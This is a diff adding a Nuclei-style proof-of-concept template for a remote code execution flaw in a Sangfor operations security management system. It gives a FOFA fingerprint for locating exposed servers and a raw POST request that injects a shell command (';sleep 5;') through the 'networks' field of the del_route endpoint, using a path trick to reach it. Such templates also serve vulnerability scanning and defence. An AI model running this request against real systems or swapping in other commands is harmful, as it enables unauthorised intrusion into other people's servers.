@@ -1,0 +1,28 @@
+id: poc-yxw8gmxeewxuqv4f
+info:
+  name: 深信服运维安全管理系统 del_route 远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yxw8gmxeewxuqv4f'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yxw8gmxeewxuqv4f
+    fofa: body="/fort/login" && header="FORTSESSIONID"
+http:
+- raw:
+  - 'POST /fort/system;help/netConfig/del_route HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+
+    ipv=4&flags=UG&gateways=1.1.1.1&networks=;sleep 5;&netmasks=255.255.255.0min'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
